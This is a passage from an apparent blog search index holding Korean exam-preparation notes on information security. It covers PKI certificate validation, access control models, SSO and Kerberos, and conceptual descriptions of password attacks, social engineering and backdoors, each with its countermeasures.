유효기간이 유효한 것이면 사용                   CRL 목록과 인증서 비교 - Yes 면 Error, No 면 Ok                                               구조                                    서명 알고리즘 식별자                   발행자 이름                   이번 업데이트 일시                   다음 업데이트 일시                   취소된 인증서들… (용량이 매우 큼)                                            사용자 인증서 일련번호                       취소일시                                                           서명                                            알고리즘, 매개변수, 암호화                                                                                       HTTP 나 LDAP 이용 하여 CRL 을 요청 -&gt; 다운로드 -&gt; 브라우저 파싱을 통해 비교                                   온라인 인증서 상태확인 프로토콜 (OCSP)                            정의                                    OCSP(Online Certificate Status Protocol)                   RFC2560                   인증서를 검증하는 신뢰 당사자가 CRL 전체를 다운로드 받지 않고, 필요한 인증서만을 네트워크를 통해 실시간으로 확인                                            인증서의 상태를 실시간으로 체크                       Client : OCSP 서버에게 인증서 상태 확인 요청                       OCSP 서버 : 각 CA인증서버들로부터 받아온 정보로부터 인증서 상태 확인응답값 제공                                                                                       동작절차                                    응용 프로그램이 OCSP 서버에게 인증서의 상태를 물음                   OCSP 서버는 good, revoked, unknown 의 내용을 담은 응답 메시지를 전자서명해서 보내줌.                                               OCSP Stapling                                    OCSP 서버는 클라이언트의 모든 인증서 질의 요청을 (HTTP) 모두 처리해야 함 (부하가 큼)                   OCSP 서버(Responder) 와 클라이언트 사이에 중계 서버를 두어 쿼리 질의 수를 줄임                                                                               PKI 의 형태                    PKI 형태에는 계층구조, 네트워크구조, 혼합형구조가 있음           계층 구조                            최상위의 루트 CA가 존재. 그 아래에 하위의 CA가 계층적으로 존재 (트리형태)               상위 인증기관이 하위 인증기관에 CA 인증서를 발행하며 하위 인증기관은 상위 인증기관의 인증정책에 영향을 받음               최상위 인증기관 간의 상호인증은 허용하지만 하위 인증기관 간의 상호인증은 원칙적으로 배제함                                    루트 CA 간의 상호인증을 통해 국제 간 상호동작을 원할하게 하는 장점                                               Chain of trust                                    모든 인증을 한 인증기관에서 받기 어렵다.                   End-entity Certificate                                            소유자 이름                       소유자 공개키                       발행자 이름 - Intermediate Certificate 소유자 이름                       발행자 서명 - Intermediate Certificate 소유자 공개키                                                           Intermediate Certificate                                            소유자 이름                       소유자 공개키                       발행자 이름 - Root 이름                       발행자 서명 - Root 공개키를 이용해 서명                                                           Root Certificate                                            Root 이름                       Root 공개키                       Root 서명 - Self Sign                                                                                       장점                                    정부와 같은 관료조직에 적합                   인증경로 탐색이 용이                   모든 사용자가 최상위 CA의 공개키를 알고 있으므로 인증서 검증 용이                                               단점                                    최상위 CA에 집중되는 오버헤드 발생                   협동업무 관계에는 부적합                   최상위 CA의 비밀키 노출 시 피해 규모 막대                                                                   네트워크 구조                            상위 인증기관의 영향 없이 인증기관 각각이 자신의 인증정책에 따라 독립적으로 존재하는 형태               CA 간에 인증을 위해 상호인증서를 발행하여 인증서비스를 함.               모든 상호인증이 허용되면 상호인증의 수가 대폭 증가하는 단점.               장점                                    유연하며 실질적인 업무관계에 적합                   CA 상호인증이 직접 이루어지므로 인증경로 단순                   CA의 비밀키 노출 시 국소적 피해                                               단점                                    인증경로 탐색이 복잡함                   인증정책 수립 및 적용 어려움                                                                   혼합형 구조                            계층구조 와 네트워크 구조의 장점을 차용                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","PKI","X.509"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-X509/",
        "teaser": null
      },{
        "title": "정보보안 - 접근통제와 사용자 인증",
        "excerpt":"접근통제     접근통제 개요            접근통제(접근제어, Access Control) 기본 개념                    컴퓨터 보안의 주된 목적                            허가되지 않은 사용자 (비인가자)에 의한 정보자원 접근 제한               정당한 사용자 (인가자)가 허가되지 않은 방법으로(비인가된 방식) 정보자원에 접근하는 것을 제한               정당한 사용자가 허가된 방식으로만 자원에 접근하도록 하는 것                                   주체(외부에서 접근하는 사람)가 객체(시스템 등 접근 대상)에 접근(Access) 할 때 보안상의 위협, 변조 등과 같은 위험으로부터 객체와 제반 환경을 보호하기 위한 보안 대책                           접근통제 절차            식별(Identification) : 인증 시스템에 본인이 누구인지 스스로를 밝히기 위해 정보를 제공 (ID, 계정번호 등) 하는 주체활동       인증(Authentication) : 주체의 신원을 검증하기 위한 사용 증명 활동 (패스워드, PIN, 토큰 등)       인가(Authorization) : 인증된 주체에게 권한을 부여하는 것       책임추적성(Accountability) : 시스템에 접근한 주체가 시스템에 어떤 행위를 하고 있는지 기록                    해명책임성으로도 해석됨           사용자의 이용을 추적하고 그의 행동에 대해 기록하고 추적하는 활동           사전 침입 의도를 감소시킴           관여하지 않은 사람에게 책임을 물어 불이익을 당하지 않도록 함           식별, 인증, 권한부여, 접근통제, 감사 개념을 기반으로 수립됨           책임추적이 가장 어려운 경우 : 하나의 계정을 여러 명이 공유할 경우                           접근통제 기본 원칙            직무 분리                    한 개인이 전체 업무에 접근 -&gt; 전체 업무를 파괴할 가능성이 있음           시스템 단계별로 나누어서 직무를 부여 -&gt; 전체 업무를 파괴하는 사고를 방지                       최소 권한 부여                    사용자가 작업을 하는데 있어서 필요한 최소한의 접근권한 / 자원을 부여           사용자의 실수나 의도적인 방법으로 인한 손상을 최소화                       입력의 신뢰성                    충분한 사용자 인증 기능이 요구됨                       개방적 정책과 폐쇄적 정책       정책 결합과 충돌해결       관리정책           사용자 인증과 메시지 인증            사용자 인증                    사용자 A가 C에 접속을 시도할 때 C와 협조하여 자신이 A임을 증명할 수 있어야 하나, B가 A를 가장할 수 없어야 함           실시간 처리                       메시지 인증 (MAC)                    실시간 처리 안됨                           사용자 인증 유형            지식 (Something you know) - 패스워드, PIN       소유 (Something you have) - 토큰, 스마트카드       존재 (Something you are) - 지문       행위 (Something you do) - 서명, 움직임       Two Factor - 위 타입 중 2가지 매커니즘을 결합한 것 (예:토큰 + PIN)                    ATM : PIN + 카드           신용카드 : 카드 + 서명                       Multi Factor - 위 타입 중 3가지 이상을 결합한 것 (예:토큰 + PIN + 지문)           인증 기법            지식에 기반을 둔 인증 (What you know)                    장점                            다양한 분야에서 사용 가능               검증 방법이 확실 (모호성이 없음)               관리비용 저렴                                   단점                            소유자가 지식을 망각했을 경우               공격자에 의해서 추측이 가능               사회공학적 공격에 매우 취약                                               소유에 기반을 둔 인증 (What you have)                    장점                            다양한 매체를 통해 인증 가능 (학생증, 신분증, 열쇠, OTP)               경제적                                   단점                            소유물이 반드시 있어야 함               복제가 가능               손실이나 도난 시 관리기능이 필요               타인이 쉽게 도용 가능 : 단독으로 사용하지 않음                                               개체 특성에 기반을 둔 인증 (What you are)                    장점                            지문, 홍채, 음성, 얼굴인식 등 무언가를 소유할 필요가 없음               도난의 염려가 없음               위조가 어려움                                   단점                            판단에 대한 모호성이 존재               관리의 어려움               관리비용 발생                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","접근통제","사용자 인증"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-AccessControl/",
        "teaser": null
      },{
        "title": "정보보안 - SSO(통합인증체계) / Kerberos",
        "excerpt":"통합인증 체계(SSO)     SSO(Single Sign On) 의 기본개념            통합 인증 체계(SSO) 정의                    한 번의 시스템 인증을 통하여 접근하고자 하는 다양한 정보시스템에 재인증 절차 없이 접근할 수 있도록 하는 통합 로그인 솔루션                            통합 로그인 솔루션 : 대표적인 인증방법으로는 커버로스(Kerberos) 를 이용한 윈도우의 액티브 디렉터리(Active Directory) 가 있다.               사용 예                                    Kerberos                   유럽식 보안 시스템 : SESAME (공개키 암호화 방식 사용, Needham Schroeder Protocol 사용)                   크립토나이트                                                                   통합신원관리 시스템의 중심적 개념은 SSO 를 사용하여 사용자가 한 번만 인증하면 네트워크의 모든 자원에 접속할 수 있게 하는 것           장점 : 사용자 편의성, 운영비용 감소, PKI 기반 보안기능 (보안성 강화)           단점 : 단일실패지점 (SPoF-SinglePointOfFailure)           EAM (Extranet Access Management) (권한관리 시스템) 은 SSO 기술 기반으로 나온 시스템 (SSO + 보안성)                            접근권한부여 / 관리 - 통합인증 권한관리 솔루션                                               SSO 구성요소                    사용자           인증서버           LDAP (Lightweight Directory Access Protocol) : X.500 을 근거로 한 디렉토리 DB에 접속하기 위한 프로토콜           SSO Agent : 각 정보시스템에 SSO 정보를 송수신                       과정                    User : User 가 Portal 에 접속           User : Portal 로그인 화면 (인증서버) 으로 Redirect           User : 인증서버에 사용자의 ID/PW (인증정보) 입력           인증서버 : LDAP (사용자 프로파일 DB) 를 이용해 사용자의 인증정보를 검증           인증서버 : Portal 에 로그인처리           User : Portal 의 각 서비스에 접근이 가능                           커버로스 (Kerberos)     개요            커버로스(Kerberos) 는 인증 프로토콜이며 동시에 KDC 이다.       이 이름은 문을 지키는 그리스 신화의 머리가 셋 달린 개의 이름에서 따온 것이다.       MIT 에서 설계를 했고 여러 버전으로 업데이트 되었다.       개방된 컴퓨터 네트워크 내에서 서비스 요구를 인증하기 위해 대칭키 암호기법에 바탕을 둔 티켓 기반 인증 프로토콜이다.       수년 동안 유닉스 시스템에서 사용되었고, 현재 윈도우 서버 운영체제에서 기본 인증기법으로 사용되고 있다.       분산 환경을 위한 SSO 의 한 예이며, 이종 네트워크를 위한 사실상의 표준           커버로스 구성요소            KDC(키분배센터) : AS(인증서버) + TGS(티켓발행서버)                    AS (인증서버)                            사용자에 대한 인증을 수행               중앙집중식 DB에 패스워드를 모두 저장               각 서버와 유일한 비밀키를 서로 공유하고 있음                                   TGS(티켓발행서버)                            AS 에 인증받은 사용자에 티켓을 발행                                               Ticket           과정            사용자 로그인 시                    클라이언트 : 티켓-승인티켓을 요청 - 인증서버에 인증 시도           인증서버 : 티켓 + 세션키를 클라이언트에 전송                       서비스 유형마다                    클라이언트 : 서비스-승인티켓을 티켓발행서버에 요청           티켓발행서버 : 티켓 + 세션키를 클라이언트에 전송                       서비스 요청                    클라이언트 : 서버에 서비스 요청           서버 : 클라이언트에 액세스 권한 부여                           취약점            KDC 는 SPoF (실패단일지점) 가 될 수 있음.       사용자에게 비밀키가 임시로 저장이 됨 -&gt; 공격자가 세션키 획득 가능       SSO 공통으로 패스워드 추측 공격에 취약       위 취약점을 보완한 것이 SESAME          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","SSO","Single Sign On","Kerberos"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-SSO/",
        "teaser": null
      },{
        "title": "정보보안 - 접근통제 보안모델",
        "excerpt":"접근통제 보안모델     접근통제의 모델            강제적 접근통제 (MAC) - Mandatory Access Control : 규칙기반(Rule Based)                    자원 - 보안레벨 (Security Level)           사용자 - 보안 취급인가 (Security Clearance)           보안레벨과 보안 취급인가를 비교하여 접근통제           Linux/Unix 는 객체(파일) 을 소유하고 있는 주체가 다른 사용자에게 권한 부여하나 MAC 에서는 주체가 다른 사용자에게 권한을 줄 수가 없음 (정해진 규칙(보안관리자가 통제) 만을 따름) - 강제적 접근통제                            관리자만이 정보자원을 분류, 설정, 변경               객체에 대한 접근 규칙 : 규칙기반 접근통제 (중앙집중형 보안관리) - 사용자가 통제를 수정할 수 없다.                                    보안전문가에 의해 생성                   운영자에 의해 설정                   운영시스템에 의해서 집행                   다른 보안기술에 의해 지원                                                                   단점                            사용자의 기능이 매우 제한적               관리적 부담이 크다               비용이 많이 소요               성능저하가 발생할 수 있음               사용자 친화적이지 않음 : 상업적인 환경에 부적합               주로 군 시스템에서 사용                                   보안레이블 (민감성레이블 - Sensitivity Label) : 시스템에 있는 자원이 얼마나 민감한 자원인지 수치화 (자원민감도, 중요성)                            모든 객체(자원)에 할당 : 파일, 디렉토리, 장비 등                                   보안허가증 : 주체가 특정 객체(특정자원) 에 접근할 수 있는지 표시           주체 S 는 객체 A 에 대한 보안허가증을 가지고 A에 접근 - 주체 S가 객체 A의 보안레이블 보다 보안허가가 높거나 같은 경우에 접근 가능           MLS (MultiLevel Security) policy : 다중 수준 보안           사용 예                            BLP (벨라파둘라 모델) : 기밀성에 중점               Biba : 무결성에 중점               Clark-Willson Model : 무결성에 중점               Chinese Wall Model (만리장성 모델) : 무결성/기밀성                                   사용 예                            NSA, SELinux, Trusted Solaris               DAC 모델로의 전환이 쉽지 않음 (보안레이블, 취급인가가 호환되지 않음)                                               임의적 접근통제 (DAC) - Discretionary Access Control : 신분에 근거                    TCSEC 표준 중 하나                            1985년 발행된 안전한 컴퓨터 시스템을 위한 평가지침서                                   신원기반 접근통제 / 사용자기반 접근통제 / 혼합방식 접근통제 : 주체가 속한 그룹의 신원에 근거하여 객체에 대한 접근을 제한           소유자의 임의성에 기반하여 접근통제           사용자에게 동적으로 접근권한을 부여 : 분산형 보안관리           유닉스/리눅스, Windows, Mac, DBMS 에서 이용           통제기법                            접근제어행렬 (Access Control Matrix)                                    주체(Row)(터미널/host/프로그램/개별사용자/그룹사용자…)                   객체(Column)                   접근권한(Cell) (소유/읽기/쓰기/실행..)                   관계를 표현 - 접근제어 정책을 관리                   주체와 객체가 많아진다면 행렬이 커지고(관리어려움), 빈 공간이 많아짐(비효율적)                                               자격목록 (CL - Capability List) : 한 주체가 갖는 자격(권한)들의 리스트                                    권한 -&gt; 주체가 객체에 대해 갖는 접근권한                   접근제어 행렬을 행(Row)단위로 관리하는 것                   Linked List 로 표현됨                                                                                                                                                            홍길동 -&gt; 파일A(RWX)                               포인터 -&gt; 파일C(RW)                               포인터 -&gt; 파일D(R)                                                                                                                                                                                               접근제어목록 (ACL - Access Control List)                                    자격목록 : 주체 관점 / 접근제어목록 : 객체 관점                   객체의 관점에서 객체에 어떤 주체가 어떤 접근권한을 갖는지 명시                   접근제어 행렬을 열(Column)단위로 관리하는 것                   Linked List 로 표현됨                                                                                                                                                            파일 A -&gt; 홍길동(RWX)                               포인터 -&gt; 고길동(RW)                               포인터 -&gt; 강길동(R)                                                                                                                                                                                                                   장점                            객체별 세분화된 접근제어가 가능               객체의 소유자가 다른 주체에게 임의적으로 접근권한 부여가 가능 -&gt; 유연한 접근제어 서비스                                   단점                            시스템 전체적으로 접근제어이 일관성이 부족               권한이 높은 주체가 다른 주체에게 임의로 자료에 대한 접근을 허용할 수 있음               주체의 신분에 따라 접근 통제가 이루어지므로 다른 주체의 신분을 사용해 불법적 접근을 할 수 있음               멀웨어 (웜, 루트킷, 트로이목마, 키로거 등 악성코드) 취약점이 존재                                    트로이목마 예시                                            Data File 에 대해 user1 이 rw 권한을 가지고 있다.                       user1 은 프로그램을 이용해 Data File 에 접근한다.                       Attacker 는 프로그램 안에 트로이목마를 심고, 이 프로그램에 대응하는 Back-Pocket 파일을 생성 (Attacker 는 rw, user1 은 w 권한을 가짐)                       Attacker 는 프로그램에 user1의 권한을 부여, user1 은 트로이목마가 심어진 프로그램을 실행                       user1 은 프로그램을 이용해 Data File 을 읽고, 해당 내용을 Back-Pocket 파일에 쓴다.                                                                                                                       역할기반 접근통제 (RBAC) - Role Based Access Control : 역할에 기반                    개요                            역할에 기반 : 접근제어 관리가 단순               MAC과 DAC의 약점을 보완한 방식 - 권한을 역할에 연관시킴               그룹과 역할의 구분                                    그룹 : 사용자들의 집합 (권한의 집합은 아님)                   역할 : 사용자들의 집합 &amp; 권한의 집합                                               중앙에서 관리되는 통제의 모음을 사용                                    관리자에 의해서 중앙집중적인 역할 (사용자집합 &amp; 권한집합) 설정                                                                   장점                            전체 시스템 관점에서 일관성 있는 접근제어가 가능               역할만 사용자에게 부여하면 됨                                    정적이면서 동적인 접근통제                                            중앙에서 역할을 정의 (정적)                                                    Role1 (File1)                           Role2 (File1, File2)                           Role3 (File1, File2, File3)                                                                       사용자와 역할을 할당 (동적)                                                    user1 -&gt; Role1                           User2 -&gt; Role1, Role2 (1:1일 필요 없음)                           user3 -&gt; Role3 -&gt; Role2                                                                                                                                                           단점                            역할수행에 반드시 필요한 접근권한만 부여해야 함 (최소권한부여원칙 준수-&gt;직무분리원칙 충족용이)                                                   접근통제 보안모델     보안모델            BLP (Bell-Lapadula) 기밀성 모델                    MAC 에 해당 (군용)           기밀성에 초점 (정보유출 차단)           정보흐름 모델                            보안레벨이 높은 정보가 보안레벨이 낮은 개체로 이동하는 것을 차단                                   최초의 수학적 모델                            MLS Policy (다중등급 보안정책 / 다중수준 보안시스템)                                    주체                                            A 각각이 갖는 허가(Clearance) 가 다름                       B 각각이 갖는 허가(Clearance) 가 다름                       C 각각이 갖는 허가(Clearance) 가 다름                                                           객체                                            가 각각이 갖는 객체레벨-분류(Classification) 이 다름                       나 각각이 갖는 객체레벨-분류(Classification) 이 다름                       다 각각이 갖는 객체레벨-분류(Classification) 이 다름                                                                                                           보안규칙                            높은 수준의 주체는 낮은 수준의 주체에 정보전달을 할 수 없어야 함               다중수준 보안시스템의 준수사항                                    No Read Up (단순보안속성:Simple Security Property) : 주체의 상향읽기금지, 하향읽기허용                                            주체가 자신보다 높은 보안수준의 객체를 읽을 수 없다.                                                           No Write Down (성형보안속성:Star Property) : 주체의 하향기록금지, 상향기록허용                                            주체가 자신보다 낮은 보안수준의 객체에 쓸 수 없다.                                                           (특수 성형 속성:Strong Star Property) : 주체는 동일한 레벨에서만 읽기/쓰기 가능                   (평정 속성:Tranquility Property) : 객체와 주체의 보안등급은 컴퓨터 수행처리과정에서 변경될수 없다.                   (참고) Dominate : 우위에 있다.                                            No Read Up : 주체의 접근클래스가 객체의 접근클래스보다 우위에 있을 때 읽기 수행이 가능하다.                                                                                       트로이 목마(Trojan Horse) 공격 방어 가능                                    DAC 와 달리 read 는 가능 (No Read Up-SS Property) 하나 write 가 안됨. (No Write Down-* Property)                                                                   약점                            지나친 기밀성 치중 (무결성, 가용성을 고려하지 않음)               은닉채널을 다루지 않음                                    보안등급이 낮은 사용자가 보안등급이 높은 사용자의 네트워크 채널에 접근 가능                                            정보흐름모델에서는 은닉채널이 존재하지 않는다는 것을 보장해야 함                                                    은닉채널 : 보안매커니즘에 의해 통제되지 않는 정보 흐름                                                                                                                                       파일공유, 서버시스템 이용에 대해서 다루지 않음                                    높은 레벨의 주체와 낮은 레벨의 주체가 같은 파일(메모리) 사용시 기밀성 훼손                   네트워크에 대한 부분이 고려되지 않음                                               MLP (다중등급 보안정책) 에 치중 (다른정책은 고려하지 않음)                                               Biba 무결성 모델                    상업용 모델로 개발           최초의 수학적 무결성 모델 : 부적절한 변조 방지                            무결성의 3가지 목표                                    비인가자의 변조 방지 : Biba 모델의 중점적 목표 (1번만 취급)                   내/외부 일관성 유지 (정확한 트랜잭션)                   인가자에 의한 불법적인 변조를 방지 (직무분리)                                                                   정보흐름 모델                            낮은 무결성 수준에서 높은 무결성 수준으로 정보가 이동하는 것을 차단                                    신뢰성이 높은 정보를 신뢰성이 낮은 정보가 훼손하는 것을 차단                                                                   보안규칙                            단순무결성 (Simple Integrity Property)                                    객체(Object)의 무결성 수준이 주체의 무결성(Subject) 수준보다 우세할 때 주체는 객체를 읽을 수 있음                   I(S) &lt;= I(O), S는 O를 읽을 수 있다.                                               무결성제한 (Star Integrity property)                                    I(S) &gt;= I(O), S는 O를 변경할 수 있다.                                               호출속성 (Invocation Property)                                    주체는 자신보다 높은 무결성 수준의 주체를 호출할 수 없다. (서비스를 요청할 수 없다.)                   I(S1) &gt;= I(S2), S1은 S2를 호출 가능                                                                               Clark-Wilson 무결성 모델                    Biba 모델보다 정교한 실제적 무결성 모델           상업용을 목표로 개발                            무결성의 3가지 목표 (Clark-Wilson 은 모두 취급)                                    비인가자의 변조 방지                   내/외부 일관성 유지 (정확한 트랜잭션)                                            예시                                                    트랙잭션의 개념                                                            A 가 B 에게 100만원을 송금하려고 할때, A 계좌에는 100만원 출금, B 계좌에는 100만원 입금이 되어야 함                               중간에 네트워크에서 문제가 발생하면 A 계좌에는 100만원 출금, B 계좌는 변동없음 &gt; 트랙잭션 개념의 필요성                                                                                   회계상 이중장부 처리시스템                                                            중복처리로 자료의 무결성을 입증                                                                                                                                                                   인가자에 의한 불법적인 변조를 방지 (직무분리)                                                                               만리장성(Chinese Wall) 모델                    Chinese Wall model = Brewer-Nash Model           MAC, DAC                            자유재량과 강제적 접근개념을 모두 이용                                   이해충돌과 관련이 있는 모델 (개인의 이익과 조직의 이익의 충돌)                            예 : 국토개발부 공무원이 부동산을 매입               예 : A 지역 부동산을 가지고 있는 국토개발부 담당공무원이 A지역 재개발계획에 참여               예 : 기업 컨설팅 업체의 A 직원이 서로 경쟁관계인 C와 D 업체의 컨설팅을 모두 하고 있음                                   정보흐름 모델                            주체와 객체 사이에서 이해충돌을 야기하는 정보의 흐름을 방지하기 위한 모델                                               Lattice 모델 (Denning 에 의해서 제안)                    BLP 모델을 확장           수학적인 구조를 이용           정보에 대한 흐름을 제어하기 위한 모델                            서로 다른 보안등급 사이에 정보가 흐르는 것을 통제               낮은 보안등급의 정보가 같거나 높은 보안등급으로만 정보가 흐르도록 통제                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","접근통제 보안모델","MAC","DAC","RBAC"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-AccessControlModel/",
        "teaser": null
      },{
        "title": "정보보안 - 접근통제 보안위협 및 대응책",
        "excerpt":"접근통제 보안위협 및 대응책     패스워드 크래커            개요                    시스템에서는 사용자들의 패스워드를 특정한 방식으로 암호화하여 보관한다.           그 방식은 절대로 풀어낼 수 없는 일방향 함수 구조로 되어 있어 유닉스/리눅스 시스템에서 패스워드를 풀어내는 일은 쉽지 않다.           하지만 무차별 대입이나 사전 등을 이용하여 편법으로 패스워드를 풀어내는 경우가 있다.           이러한 일을 해주는 프로그램을 패스워드 크래커라고 한다.           패스워드를 알아내는 가장 효율적인 방법은 하이브리드 공격으로 사전공격+무차별 공격을 병행하는 것이다.                       유형                    사전공격 (Dictionary Attack)                            패스워드 사전 파일을 이용하여 접속 계정을 알아내는 해킹 방법               공격자들은 패스워드의 해시된 값 혹은 패스워드 파일을 포착하며, 포착 후 소프트웨어 툴은 자체 내에 이미 포함된 단어와 포착된 패스워드가 일치할 때까지 비교작업을 수행한다.                                   무차별공격 (Brute-force Attack)                            성공할 때까지 가능한 모든 조합의 경우의 수를 시도해 원하는 공격을 시도하는 방법               대표적인 예로 크랙 등 소프트웨어를 이용해서 로그인 이름에 대한 패스워드를 추측하는 방법이 있음               무차별 공격방법들은 워다이얼링(wardialing) 에도 사용됨.                                    워다이얼링(wardialing) : 수천개의 전화번호에 자동으로 전화를 걸어 모뎀이 장착된 번호를 찾는 컴퓨터 해킹 기술                                                                   레인보우 테이블 공격                            1980년도에 개발된 공격방법. 2000년대에 유명해짐.                                    원도우 NT 버전 LM(Lan Manager) Hash 알고리즘이 깨지게 됨. -&gt; Vista 버전 이후 사용하지 않음                                               패스워드 후보군을 만들어 Salt 와 결합하여 Hash 한 결과를 거대한 사전으로 만들어 공격                                               대응책                    패스워드를 암호화하기 전에 부가적인 숫자(Salt)를 패스워드에 덧붙인 후 암호화하여 저장하는 방법 : 사전공격에 대한 내성 향상           패스워드가 평문으로 전송되지 않도록 하여 패스워드 패킷 스니핑을 방지           One-Time Password 사용. 패스워드 암호화. IDS/IPS 를 통해 반복적인 트래픽 감시           패스워드 입력횟수를 제한하는 임계치(Clipping Level) 을 적용하는 방법                           사회공학            정의                    일반적 정의 : 신뢰할 수 있는 사람/조직 으로 가장하여 다른 사람들로 하여금 자신의 목적을 위해 행동하게 하는 기술           컴퓨터 기반 정의 : 신뢰할 수 있는 컴퓨터프로그램, 이메일, 웹사이트 등으로 위장하여 공격자 의도대로 희생자의 개인정보, 신용정보를 탈취하기 위해 악성코드를 설치하는 공격방법           이메일 기반 정의 : 관심을 끌만한 이메일 제목, 내용 등을 통해 첨부된 악성코드 파일을 실행하게 하여 희생자의 개인정보, 신용정보를 탈취하는 공격방식                       사회공학공격 분류                    인간 기반의 사회공학 공격 (Human-based Social Engineering Attack)                            종류                                    어깨 넘어 훔쳐보기 (Shoulder Surfing) - 전통적인 스니핑 방법                   쓰레기통 뒤지기 (Dumpster Diving)                   협박메일 (Blackmail)                                            어떤 정보를 폭로하겠다고 협박하여 재물을 갈취하는 행위                                                           따라 들어가기 (Piggybacking, Tailgating)                                            출입증 소지자가 출입 시 함께 뒤따라 출입한다.                                                           내부자의 결탁으로 인한 정보유출, 내부자 부주의로 인한 외부에서의 정보 습득                                               절차                                    정보수집                                            피해자의 전화번호를 무작위로 수집 (인터넷, 설문조사 등)                                                           관계 형성                                            전화를 이용하여 고위 공무원이나 금융담당자로 속여 마치 피해자나 피해자 주위 사람에게 문제가 생긴 것처럼 말하여 관심 유도                                                           공격                                            금전적인 문제를 해결하기 위해서라며 피해자가 계좌이체를 하도록 요구                                                           실행                                            피해자는 문제를 해결하기 위해 계좌이체를 하게되며 공격자는 목표 달성                                                                                       대응책                                    전화통화의 음질 이상, 내용 이상 시 주의                   신원증명 요청시 주의                   이메일이나 팩스로 정보를 전송해달라고 요청하는 경우 주의                   문서세절기 이용하여 중요서류 파쇄                   임직원 보안 인식교육 주기적으로 실시                                                                   ICT 사회공학 공격 (Information and Communication Technology Social Engineering Attack)                            종류                                    피싱 (Phishing)                                            개요                                                    피싱은 개인정보(private data) 와 낚시(fishing) 의 합성어로 개인정보를 낚는다는 의미                           수신자에게 이메일을 발송하여 Pisher 들이 운영하는 위조된 사이트로 이동시킨 후 이들에게 사이트 개편 등의 이유로 고객정보(신용카드번호, 비밀번호 등) 을 요구한다.                                                                       공격방법 및 대응방법                                                    공격방법 : 유사한 이메일 주소 사용, 유사한 도메인 이름 사용, 이메일 주소 스푸핑, 주소창 위조, 팝업창 이용 등                           대응방법 : 사용자 주의, URL 필터링, 사용자 대상 홍보, 의심사이트에 대한 신고하기 등                                                                                                           파밍 (Pharming)                                            개요                                                    해커가 도메인 자체를 중간에서 탈취, 진짜 사이트 주소를 입력해도 가짜 사이트로 연결되도록 하는 것으로 피싱에서 더 나아간 형태 (피싱보다 피해가 큼)                                                                       공격방법 및 대응방법                                                    공격방법 : DNS 서버로 IP 요청 갈취 후 위조된 사이트로 Redirection 시킴                                                                                                           스미싱 (Smishing)                                            개요                                                    SMS 와 Phishing 의 결합어로 휴대폰 문자메시지를 이용하여 피싱하는 방법                                                                       공격방법 및 대응방법                                                    공격방법 :                                                            전형적인 유형으로 데이터 서비스 웹사이트로부터 온 휴대폰 메시지가 해당 웹사이트를 방문하여 서비스를 해지하지 않으면 일정금액의 요금이 청구된다고 메시지를 보내서 유인                               이를 통해 휴대폰 사용자로 하여금 특정 웹사이트로 유인한 후 사용자의 PC에 트로이목마 프로그램을 설치하고, 사용자의 금융정보나 비밀번호를 알아냄                                                                                   대응방법 : URL 확인, 주기적인 교육/훈련                                                                                                           스피어 피싱 (Spear Phishing)                                            개요                                                    조직 내에 신뢰할만한 사람으로 위장해 메일을 보내 ID/PW 를 탈취한다.                                                                       공격방법 및 대응방법                                                    위조된 사이트에 접속 유도 혹은 첨부파일 등을 이용한 악성코드 설치                                                                                                                                                                           백도어(back door) / 트랩도어 (Trap door)            개요                    시스템의 보안이 제거된 비밀통로, 서비스 기술자나 유지보수 프로그래머들의 접근 편의를 위해 시스템 설게자가 고의적으로 만들어 놓은 통로           현장에서 서비스 기술자나 공급사의 유지보수 프로그래머가 업무 편의성을 향상시키기 위함           악의적인 목적으로 만들어 놓은 통로도 있는데, 백 오리피스 (Back orifice) 가 대표적임                            이 프로그램은 해킹 프로그램의 일종으로 PC에 내장되어 사용자 몰래 사용자의 정보를 저장, 유출하기 위한 프로그램임               대표적인 트로이목마                                   웜 홀(Worm Hole), 트랩도어, Maintenance hook, Adminstrative hook 이라고도 함                       백도어 종류                    파일 시스템 백도어                            ls, du, fsck 같은 명령어를 수정해서 특정 디렉터리나 파일을 숨김               숨기려는 부분을 배드섹터로 처리                                   프로세스 은닉 백도어                            특정 프로세스를 숨겨서 합리적인 서비스를 가장함               라이브러리 루틴 수정으로 프로세스를 숨김               커널 수정으로 특정 프로세스를 숨김                                   네트워크 트래픽 백도어                            네트워크 트래픽을 숨김               사용하지 않는 네트워크 포트를 사용하여 침입                                   TCP 셸 백도어                            1024번 이상의 TCP 포트에 셸 제공 네트워크 서비스 설치               netstat 등을 통해 확인이 가능                                   UDP 셸 백도어                            침입차단 시스템 우회가 가능 (DNS 서비스를 위해서 UDP 패킷을 허락)                                   login 백도어                            login.c 프로그램을 수정함               특정 백도어 패스워드 입력 시 인증과정 없이 로그인 허용               utmp 나 wtmp 등과 같은 로그파일에 기록되지 않음                                    utmp : 현재시스템에 로그인한 사용자의 상태정보/w,who,finger                   wtmp : 사용자의 성공한 로그인,로그아웃정보,시스템의 부팅/종료정보 히스토리/last                   lastlog : 마지막 성공한 로그인 정보를 가지고 있는 로그파일                   btmp : 실패한 로그인 시도에 대한 기록/lastb                   loginlog : btmp 와 동일하나 text 파일이고, Unix 에서 사용                                               MD5 에 의한 무결성 점검이 권고됨                                   library 백도어                            공유 라이브러리를 사용함               crypt.c 등을 수정해서 백도어를 삽입함                                   kernel 백도어                            커널 자체를 수정함               가장 찾기 어려운 백도어로 MD5 체크썸으로도 진단이 불가능함.                                   리눅스/유닉스 백도어                            httpd 시작프로그램을 이용해서 자동 실행                                    root 권한으로 데몬 운영 : 보안상 매우 취약                                            클라이언트가 접속을 하게 되면 httpd 가 root 권한으로 실행됨 = 클라이언트 역시 root 권한                       클라이언트가 접속하면 httpd 를 nobody 로 실행되게 설정해야 함                                                                                                                       발생원인                    제거하는 것을 잊어버린 경우           테스트를 위해 고의적으로 남겨두는 경우           완성된 프로그램의 유지보스를 위해 고의적으로 남겨두는 경우                       대응책                    인터넷 취약점을 이용하는 스니핑과 달리 백도어 프로그램은 사용자들이 조금만 주의를 기울이면 쉽게 예방할 수 있으며 방법 또한 바이러스 예방과 크게 다르지 않음           프로그램이 개발되어 실제의 작업환경에서 사용될 때 트랩도어로써 활용될 수 있는 루틴들의 제거 여부를 확인하여야 하며, 실제 프로그램에 대한 테스트를 하면서 